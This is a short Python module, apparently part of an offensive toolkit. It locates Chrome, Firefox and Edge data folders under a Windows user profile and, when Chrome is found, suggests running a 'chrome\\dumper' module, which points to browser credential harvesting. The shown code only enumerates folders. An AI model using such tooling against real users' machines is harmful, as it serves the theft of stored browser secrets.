import platform
import os
from tools import general

class Module:
    def __init__(self) -> None:
        self.unix_like = not 'windows' in platform.platform().lower()
        self.app_data = os.path.join(os.environ['USERPROFILE'], 'AppData')
        self.browser_dict = {
            'Chrome' : os.path.join(
                self.app_data,
                'Local',
                'Google',
            ),
            'Mozilla' : os.path.join(
                self.app_data,
                'Local',
                'Mozilla',
            ),
            'Edge' : os.path.join(
                self.app_data,
                'Local',
                'Microsoft',
                'Edge',
            )
        }

    def run(self):
        for key in self.browser_dict.keys():
            path = self.browser_dict[key]
            if os.path.exists(path):
                print(f'\t[+] Discoverd : {key} => {path}')

                if key == 'Chrome':
                    print(f'\t[*] Suggest : chrome\\dumper')